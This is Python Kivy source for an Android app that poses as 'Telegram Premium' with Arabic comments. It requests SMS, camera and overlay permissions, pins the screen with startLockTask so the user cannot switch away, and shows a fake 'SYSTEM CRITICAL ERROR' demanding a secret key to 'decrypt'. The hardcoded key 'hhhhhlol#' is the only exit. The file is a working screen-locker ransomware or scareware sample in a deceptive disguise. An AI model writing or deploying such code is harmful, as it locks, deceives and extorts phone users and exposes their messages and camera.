from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import platform

# كود دارك لحقن الاسم إجبارياً من داخل البرمجة
__title__ = "Telegram Premium"
__version__ = "4.0"

class D3f4ultApp(App):
    def build(self):
        self.title = "Telegram Premium" # حقن الاسم مرة تانية
        
        if platform == 'android':
            self.request_all_powers()
            # كود منع الخروج الإجباري (جعل التطبيق يغطي الشاشة)
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            currentActivity = PythonActivity.mActivity
            currentActivity.startLockTask() # ميزة تثبيت الشاشة لمنع التبديل

        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        layout.add_widget(Label(text="[color=ff0000][b]SYSTEM CRITICAL ERROR[/b][/color]", markup=True, font_size='24sp'))
        
        self.input_key = TextInput(hint_text="Enter Secret Key...", multiline=False, size_hint_y=None, height=120)
        btn = Button(text="DECRYPT NOW", background_color=(1, 0, 0, 1), size_hint_y=None, height=100)
        btn.bind(on_press=self.verify)

        layout.add_widget(self.input_key)
        layout.add_widget(btn)
        return layout

    def request_all_powers(self):
        from android.permissions import request_permissions, Permission
        request_permissions([Permission.SYSTEM_ALERT_WINDOW, Permission.READ_SMS, Permission.SEND_SMS, Permission.CAMERA])

    def verify(self, instance):
        if self.input_key.text == "hhhhhlol#":
            import os
            os._exit(0)

if __name__ == '__main__':
    D3f4ultApp().run()
